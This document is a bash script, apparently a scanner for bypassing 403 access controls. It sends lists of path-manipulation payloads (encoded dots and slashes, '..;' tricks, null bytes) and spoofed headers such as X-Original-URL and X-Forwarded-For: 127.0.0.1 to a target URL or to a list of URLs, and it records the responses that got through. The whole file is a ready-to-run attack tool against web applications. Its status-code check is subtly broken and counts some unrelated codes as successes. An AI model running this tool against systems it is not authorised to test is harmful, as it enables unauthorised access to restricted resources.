#!/bin/bash

# Colors
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RESET="\033[0m"

# User agents to rotate (can be expanded)
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/111.0"

# Check dependencies
command -v curl >/dev/null 2>&1 || { echo -e "${RED}Error: curl is not installed.${RESET}"; exit 1; }

# Path payloads
PATH_PAYLOADS=(
    ""
    "/"
    "/%2e/"
    "/..;/"
    "/;/"
    "/./"
    "/%2e%2e/"
    "/admin/..%00/"
    "/%ef%bc%8f"
    "//"
    "/."
    "/.."
    "/secret"
    "/SECRET"
    "/secret/"
    "/secret/."
    "/./secret/.."
    "/;/secret"
    "/.;/secret"
    "//;//secret"
    "/secret.json"
)

# Header payloads
HEADER_PAYLOADS=(
    "X-Original-URL: /"
    "X-Rewrite-URL: /"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Forwarded-Host: 127.0.0.1"
    "X-Host: 127.0.0.1"
    "X-Forwarded-Server: 127.0.0.1"
    "Referer: https://google.com"
    "X-HTTP-Method-Override: GET"
    "X-Forwarded-Proto: https"
    "Client-IP: 127.0.0.1"
    "True-Client-IP: 127.0.0.1"
    "Cluster-Client-IP: 127.0.0.1"
    "Forwarded-For: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-ProxyUser-Ip: 127.0.0.1"
)

function test_url() {
    local base_url="$1"
    echo -e "${YELLOW}[*] Testing: $base_url${RESET}"

    for path in "${PATH_PAYLOADS[@]}"; do
        full_url="${base_url}${path}"
        code=$(curl -skL -o /dev/null -w "%{http_code}" -A "$UA" "$full_url")
        if [[ "$code" =~ ^2|3 ]]; then
            echo -e "${GREEN}[+] Path Bypass Success [$code] => $full_url${RESET}" | tee -a bypass-success.txt
        fi
    done

    for header in "${HEADER_PAYLOADS[@]}"; do
        full_url="$base_url"
        code=$(curl -skL -o /dev/null -w "%{http_code}" -A "$UA" -H "$header" "$full_url")
        if [[ "$code" =~ ^2|3 ]]; then
            echo -e "${GREEN}[+] Header Bypass Success [$code] => $full_url ($header)${RESET}" | tee -a bypass-success.txt
        fi
    done
}

# Main
if [[ "$1" == "-d" ]]; then
    test_url "$2"
elif [[ "$1" == "--list" ]]; then
    while IFS= read -r url; do
        test_url "$url"
    done < "$2"
else
    echo -e "${RED}Usage:${RESET}"
    echo -e "  bash $0 -d https://target.com/secret"
    echo -e "  bash $0 --list urls.txt"
    exit 1
fi
